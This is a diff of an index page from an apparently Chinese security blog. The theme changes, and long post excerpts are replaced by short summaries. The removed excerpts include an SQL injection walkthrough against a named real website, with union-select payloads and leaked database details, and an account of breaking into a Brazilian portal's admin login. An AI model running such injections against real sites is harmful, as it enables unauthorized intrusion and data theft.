@@ -1,281 +1,396 @@
-<!DOCTYPE html>
-<html>
 
+ <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="记录互联网安全历程与个人成长经历">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="home-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
-</header>
+    </header>
+    
 
-      
-<main class="content" role="main">
+    <div id="container">
+      <div id="main">
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-28T07:48:16.000Z" itemprop="datePublished">
-          2012-06-28
-      </time>
-    
-    
-    | 
-    <a href='/tag/渗透/'>渗透</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/611.seo/">记新手的一次渗透入侵</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><table border="0" cellspacing="0" cellpadding="0"><tbody>     <tr>       <td>         <p>一年前把，<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a><b></b>了，这次发现不是root，但帐户支持load_file()            <br />Ps：我严重鄙视挂马的人，还有那些黑心贩子。。。            <br />Ps：我从一开始写文章到现在，不屏蔽<b>渗透</b>的地址连接，主要的原因还是希望            <br />大家可以通过我的文章，真正实践性滴学习本文内容，新人朋友可以一步步滴实践操作            <br />【懒得扯淡了，希望大家那个什么什么什么，你们懂的，人品很重要】            <br /><a href="http://www.czxtaiji.net/content.php?theMenuId=4&amp;theSubMenuId=1&amp;theArticleId=48%20and%201=2">http://www.czxtaiji.net/content. … leId=48%20and%201=2</a>            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 947            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 948            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 949            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 950            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 951            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 952            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 953            <br />获取到路径：d:\czxsite\bin\sys\config.php            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/0a82505b9f50_14E77/clip_image002.jpg" width="604" height="316" />            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=48 order by 9            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/0a82505b9f50_14E77/clip_image004.jpg" width="604" height="240" />            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=-48 union select 1,2,3,4,5,6,7,8,9            <br />Warning: disparticlecontent(7): failed to open stream: No such file or directory in d:\czxsite\bin\sys\config.php on line 976            <br />Warning: disparticlecontent(): Failed opening ‘7’ for inclusion (include_path=’.;c:\php4\pear’) in d:\czxsite\bin\sys\config.php on line 976            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=-48 union select 1,2,3,4,user(),database(),7,8,version()            <br />user():czxtaiji@localhost            <br />version():4.0.18-nt&#160;&#160; <br />database():czxtaiji            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/0a82505b9f50_14E77/clip_image006.jpg" width="604" height="237" /></p>       </td>     </tr>   </tbody></table>
-      
-      </p>
-      
-      <p>
-          <a href="/611.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/611.seo/" title="记新手的一次渗透入侵" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-28T07:38:55.000Z" itemprop="datePublished">
-          2012-06-28
-      </time>
+    <h1 itemprop="name">记新手的一次渗透入侵</h1>
     
+     
+       <p itemprop="description" >一年前把，渗透了，这次发现不是root，但帐户支持load_file()            Ps：我严重鄙视挂马的人，还有那些黑心贩子。。。            Ps：我从一开始写文章到现在，不屏蔽渗透的地址连接，主要的原因还是希望            大家可以通过我的文</p>
+      
     
-    | 
-    <a href='/tag/网络安全/'>网络安全</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/609.seo/">某大型企业局域网安全解决方案</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>第一章 总则 </p>  <p>本方案为某大型局域网<a href="http://ha.cker.in/tag/网络安全" target="_blank">网络安全</a>解决方案，包括原有网络系统分析、安全需求分析、安全目标的确立、安全体系结构的设计、等。本安全解决方案的目标是在不影响某大型企业局域网当前业务的前提下，实现对他们局域网全面的安全管理。 </p>  <p>1.将安全策略、硬件及软件等方法结合起来，构成一个统一的防御系统，有效阻止非法用户进入网络，减少网络的安全风险。    <br />2.定期进行漏洞扫描，审计跟踪，及时发现问题，解决问题。     <br />3.通过入侵检测等方式实现实时安全监控，提供快速响应故障的手段，同时具备很好的安全取证措施。     <br />4.使网络管理者能够很快重新组织被破坏了的文件或应用。使系统重新恢复到破坏前的状态，最大限度地减少损失。     <br />5.在工作站、服务器上安装相应的防病毒软件，由中央控制台统一控制和管理，实现全网统一防病毒。 </p>  <p>第二章 网络系统概况 </p>  <p>2.1 、网络概况    <br />这个企业的局域网是一个信息点较为密集的千兆局域网络系统，它所联接的现有上千个信息点为在整个企业内办公的各部门提供了一个快速、方便的信息交流平台。不仅如此，通过专线与Internet的连接，打通了一扇通向外部世界的窗户，各个部门可以直接与互联网用户进行交流、查询资料等。通过公开服务器，企业可以直接对外发布信息或者发送电子邮件。高速交换技术的采用、灵活的网络互连方案设计为用户提供快速、方便、灵活通信平台的同时，也为网络的安全带来了更大的风险。因此，在原有网络上实施一套完整、可操作的安全解决方案不仅是可行的，而且是必需的。 </p>  <p>2.1.1 、网络概述 </p>  <p>这个企业的局域网，物理跨度不大，通过千兆交换机在主干网络上提供1000M的独享带宽，通过下级交换机与各部门的工作站和服务器连结，并为之提供100M的独享带宽。利用与中心交换机连结的Cisco 路由器，所有用户可直接访问Internet。 </p>  <p>2.1.2 、网络结构 </p>  <p>这个企业的局域网按访问区域可以划分为三个主要的区域：Internet区域、内部网络、公开服务器区域。内部网络又可按照所属的部门、职能、安全重要程度分为许多子网，包括：财务子网、领导子网、办公子网、市场部子网、中心服务器子网等。在安全方案设计中，我们基于安全的重要程度和要保护的对象，可以在Catalyst 型交换机上直接划分四个虚拟局域网（VLAN），即：中心服务器子网、财务子网、领导子网、其他子网。不同的局域网分属不同的广播域，由于财务子网、领导子网、中心服务器子网属于重要网段，因此在中心交换机上将这些网段各自划分为一个独立的广播域，而将其他的工作站划分在一个相同的网段。（图省略） </p>
-      
-      </p>
-      
-      <p>
-          <a href="/609.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2012-06-28T07:48:16.000Z" itemprop="datePublished">2012-06-28</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-25T06:39:29.000Z" itemprop="datePublished">
-          2012-06-25
-      </time>
-    
-    
-    | 
-    <a href='/tag/xss/'>xss</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/603.seo/">xss的发现与利用</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>xss老生常谈了xss的发现也是有一些技巧的，这里介绍一种。   <br />很多人习惯是直接输入一些特殊字符进行判断，其实吧，在你发送的时候抓一下包看下会有惊喜哦！    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/xss_13E92/clip_image002.jpg" width="604" height="460" /> </p>
-      
-      </p>
-      
-      <p>
-          <a href="/603.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/609.seo/" title="某大型企业局域网安全解决方案" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-23T08:12:10.000Z" itemprop="datePublished">
-          2012-06-23
-      </time>
+    <h1 itemprop="name">某大型企业局域网安全解决方案</h1>
     
-    
-    | 
-    <a href='/tag/提权/'>提权</a>,
-    
-    <a href='/tag/SQLServer/'>SQLServer</a>,
-    
-    <a href='/tag/Sa/'>Sa</a>,
-    
-    <a href='/tag/拿Webshell/'>拿Webshell</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/600.seo/">入侵巴西最大门户网站</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
+     
+       <p itemprop="description" >第一章 总则   本方案为某大型局域网网络安全解决方案，包括原有网络系统分析、安全需求分析、安全目标的确立、安全体系结构的设计、等。本安全解决方案的目标是在不影响某大型企业局域网当前业务的前提下，实现对他们局域网全面的安全管理。   1.将安全策略、硬件及软件等方法结合起来，构成</p>
       
-        <p>标题:入侵巴西最大门户网站</p>  <p>作者:hackdn</p>  <p>转载注明</p>  <p>大家新年好，过年了，2012你的船票买好了么？</p>  <p>今天是除夕，貌似农历没大年三十</p>  <p>下午上网没事儿做，朋友甩来一网站，让我顺便帮帮安检了下，他让发下过程，就随便写写，有点乱，</p>  <p>主要是后台拿SHELL费劲了半天，高手直接飞过吧。。</p>  <p>巴西最大门户网站<a href="http://www.senai.br/">www.senai.br</a>（塞纳工业 - -！）</p>  <p>GG搜了下，出来的点肯定都是不能直接注入的，该过滤的都过滤掉了~</p>  <p>工具扫了下，IIS 6的组建，幸好找到了后台路径</p>  <p><a href="http://www.senai.br/admin/login.aspx">http://www.senai.br/admin/login.aspx</a>    <br />弱口令试了遍，进不去，’or’’=’ 没反应’or’=’or’直接报错，幸亏没禁MAGIC.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image001.jpg" width="858" height="671" /></p>  <p></p>
-      
-      </p>
-      
-      <p>
-          <a href="/600.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    
+    <time datetime="2012-06-28T07:38:55.000Z" itemprop="datePublished">2012-06-28</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-23T01:35:43.000Z" itemprop="datePublished">
-          2012-06-23
-      </time>
-    
-    
-    | 
-    <a href='/tag/漏洞/'>漏洞</a>,
-    
-    <a href='/tag/溢出/'>溢出</a>,
-    
-    <a href='/tag/MS12-020/'>MS12-020</a>,
-    
-    <a href='/tag/Exploit/'>Exploit</a>,
-    
-    <a href='/tag/Vulnerability/'>Vulnerability</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/596.seo/">Microsoft RDP Vulnerability Exploit (CVE-2012-0002 ) 微软MS12-020漏洞视频演示</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>Microsoft RDP Vulnerability Exploit (CVE-2012-0002&#160; MS12-020)</p>  <p><embed src="http://player.youku.com/player.php/sid/XNDE3OTc4MjM2/v.swf" allowFullScreen="true" quality="high" width="480" height="400" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed></p>  <p>这是一个密报的漏洞，微软肯定是先推送补丁修复了（微软在北京时间2012-03-13号就推送了该补丁），然后才公开的报告。</p>  <p>不然，如果该<strong>ms12-20</strong>漏洞在地下流传，企业、政府、银行、军队等重要机构的大型服务器将无一幸免，完全沦陷！这会造成极其严重的后果！</p>  <p>（这也是为什么重要机构的大型服务器都根本不使用 Windows 系统，一方面是性能原因，另一方面是安全因素，还有一方面是国家安全与战争因素了，</p>  <p>米国政府的秘密机构手中掌握有大量此类零日漏洞，并且都是未公开的一旦发动战争，这些都是武器，平时则用来窃取敌对国家情报……）</p>  <p><strong>ms12-20</strong> 远程桌面(RDP)3389漏洞 exp 如何检查自己是否已安装更新补丁？</p>  <p>这个漏洞的更新补丁号为：KB2621440，用户可以自行在：控制面板 –&gt; 添加删除程序（记得勾选“显示更新”</p>  <p>），然后查找该编号，如果有则表示您已安装，可以不必担心了，或者使用命令：</p>  <blockquote>   <p>systeminfo|find /i &quot;KB2621440&quot;</p> </blockquote>
-      
-      </p>
-      
-      <p>
-          <a href="/596.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/603.seo/" title="xss的发现与利用" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-23T00:43:02.000Z" itemprop="datePublished">
-          2012-06-23
-      </time>
+    <h1 itemprop="name">xss的发现与利用</h1>
     
+     
+       <p itemprop="description" >xss老生常谈了xss的发现也是有一些技巧的，这里介绍一种。   很多人习惯是直接输入一些特殊字符进行判断，其实吧，在你发送的时候抓一下包看下会有惊喜哦！</p>
+      
     
-    | 
-    <a href='/tag/RedHat/'>RedHat</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/593.seo/">RedHat替换CentOS的源和汉化</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        替换CentOS的源  源文件备份：  cd/etc/yum.respo.d/;mv rhel-debuginfo.repo rhel-debuginfo.repo.bak;  vi rhel-debuginfo.repo     [base]name=centos-5 - Basebaseurl=http://centos.ustc.edu.cn/centos/5/os/i386/# the other site: http://ce
-      
-      </p>
-      
-      <p>
-          <a href="/593.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2012-06-25T06:39:29.000Z" itemprop="datePublished">2012-06-25</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <nav class="pagination" role="pagination">
-    <a class="newer-posts" href="/page/49/">← Newer Posts</a>
-    <span class="page-number">Page 50 of 81</span>
-    <a class="older-posts" href="/page/51/">Older Posts →</a>
+    <a href="/600.seo/" title="入侵巴西最大门户网站" itemprop="url">
+  
+    <h1 itemprop="name">入侵巴西最大门户网站</h1>
+    
+     
+       <p itemprop="description" >标题:入侵巴西最大门户网站  作者:hackdn  转载注明  大家新年好，过年了，2012你的船票买好了么？  今天是除夕，貌似农历没大年三十  下午上网没事儿做，朋友甩来一网站，让我顺便帮帮安检了下，他让发下过程，就随便写写，有点乱，  主要是后台拿SHELL费劲了半天，高手</p>
+      
+    
+    <time datetime="2012-06-23T08:12:10.000Z" itemprop="datePublished">2012-06-23</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/596.seo/" title="Microsoft RDP Vulnerability Exploit (CVE-2012-0002 ) 微软MS12-020漏洞视频演示" itemprop="url">
+  
+    <h1 itemprop="name">Microsoft RDP Vulnerability Exploit (CVE-2012-0002 ) 微软MS12-020漏洞视频演示</h1>
+    
+     
+       <p itemprop="description" >Microsoft RDP Vulnerability Exploit (CVE-2012-0002&amp;#160; MS12-020)    这是一个密报的漏洞，微软肯定是先推送补丁修复了（微软在北京时间2012-03-13号就推送了该补丁），然后才公开的报告。  不然，如果该ms</p>
+      
+    
+    <time datetime="2012-06-23T01:35:43.000Z" itemprop="datePublished">2012-06-23</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/593.seo/" title="RedHat替换CentOS的源和汉化" itemprop="url">
+  
+    <h1 itemprop="name">RedHat替换CentOS的源和汉化</h1>
+    
+     
+           <p itemprop="description" >替换CentOS的源  源文件备份：  cd/etc/yum.respo.d/;mv rhel-debuginfo.repo rhel-debuginfo.repo.bak;  vi rhel-debuginfo.repo     [base]name=centos-5 - Ba</p>
+        
+    
+    <time datetime="2012-06-23T00:43:02.000Z" itemprop="datePublished">2012-06-23</time>
+  </a>
+</section>
+
+
+  <nav id="page-nav" class="clearfix">
+    <a class="extend prev" rel="prev" href="/page/49/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/48/">48</a><a class="page-number" href="/page/49/">49</a><span class="page-number current">50</span><a class="page-number" href="/page/51/">51</a><a class="page-number" href="/page/52/">52</a><span class="space">&hellip;</span><a class="page-number" href="/page/81/">81</a><a class="extend next" rel="next" href="/page/51/">下一页 &raquo;</a>
   </nav>
-</main>
 
+</div>
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
 
-      
-<footer class="site-footer">
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  <p class="asidetitle">关注</p>
+<iframe width="100%" height="120" class="share_self" marginheight="5px" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=120&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=2583230784&verifier=1d07a1a0&dpc=1"></iframe>
+
   
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
-  </div>
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/category/Linux笔记/" title="Linux笔记">Linux笔记<sup>46</sup></a></li>
+		
+			<li><a href="/category/Web安全/" title="Web安全">Web安全<sup>88</sup></a></li>
+		
+			<li><a href="/category/代码学习/" title="代码学习">代码学习<sup>25</sup></a></li>
+		
+			<li><a href="/category/原创文章/" title="原创文章">原创文章<sup>37</sup></a></li>
+		
+			<li><a href="/category/工具视频/" title="工具视频">工具视频<sup>12</sup></a></li>
+		
+			<li><a href="/category/影音娱乐/" title="影音娱乐">影音娱乐<sup>15</sup></a></li>
+		
+			<li><a href="/category/手机安全/" title="手机安全">手机安全<sup>11</sup></a></li>
+		
+			<li><a href="/category/无线安全/" title="无线安全">无线安全<sup>4</sup></a></li>
+		
+			<li><a href="/category/渗透测试/" title="渗透测试">渗透测试<sup>94</sup></a></li>
+		
+			<li><a href="/category/疑难杂症/" title="疑难杂症">疑难杂症<sup>11</sup></a></li>
+		
+			<li><a href="/category/精品软件/" title="精品软件">精品软件<sup>16</sup></a></li>
+		
+			<li><a href="/category/絮叨碎语/" title="絮叨碎语">絮叨碎语<sup>47</sup></a></li>
+		
+			<li><a href="/category/黑客技巧/" title="黑客技巧">黑客技巧<sup>77</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tag/net/" title=".net">.net<sup>1</sup></a></li>
+		
+			<li><a href="/tag/0day/" title="0day">0day<sup>5</sup></a></li>
+		
+			<li><a href="/tag/12306/" title="12306">12306<sup>3</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂/" title="12306刷票外挂">12306刷票外挂<sup>1</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂下载/" title="12306刷票外挂下载">12306刷票外挂下载<sup>1</sup></a></li>
+		
+			<li><a href="/tag/1521/" title="1521">1521<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3389/" title="3389">3389<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360/" title="360">360<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3600safe/" title="3600safe">3600safe<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360浏览器抢票专版/" title="360浏览器抢票专版">360浏览器抢票专版<sup>1</sup></a></li>
+		
+			<li><a href="/tag/61398/" title="61398">61398<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ACL/" title="ACL">ACL<sup>1</sup></a></li>
+		
+			<li><a href="/tag/APT/" title="APT">APT<sup>3</sup></a></li>
+		
+			<li><a href="/tag/ARP/" title="ARP">ARP<sup>2</sup></a></li>
+		
+			<li><a href="/tag/ASP/" title="ASP">ASP<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ASP中FSO的神奇功能/" title="ASP中FSO的神奇功能">ASP中FSO的神奇功能<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ATM/" title="ATM">ATM<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript中shellcode的定位和提取/" title="ActionScript中shellcode的定位和提取">ActionScript中shellcode的定位和提取<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript的反汇编和反编译/" title="ActionScript的反汇编和反编译">ActionScript的反汇编和反编译<sup>1</sup></a></li>
+		
+			<li><a href="/tag/Acunetix-Web-Vulnerability-Scanner/" title="Acunetix Web Vulnerability Scanner">Acunetix Web Vulnerability Scanner<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://blog.csdn.net/dreajay" target="_blank" title="dreajay csdn">CSDN</a></li>
+      <li><a href="https://github.com/dreajay" target="_blank" title="dreajay github">github</a></li>
+      <li><a href="http://www.douban.com/people/72514701/" target="_blank" title="dreajay豆瓣">豆瓣</a></li>
+    </ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
 </footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
 
 
 
-  </div>
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 </div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
 
-<nav  class="outer-nav top horizontal">
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
+  </body>
+ </html>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
-
-          <a class="icon-image"  href="/images"><span>Images</span></a>
-
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
-
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
-
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
-
-</nav>
-
-</div>
-</body>
-</html>
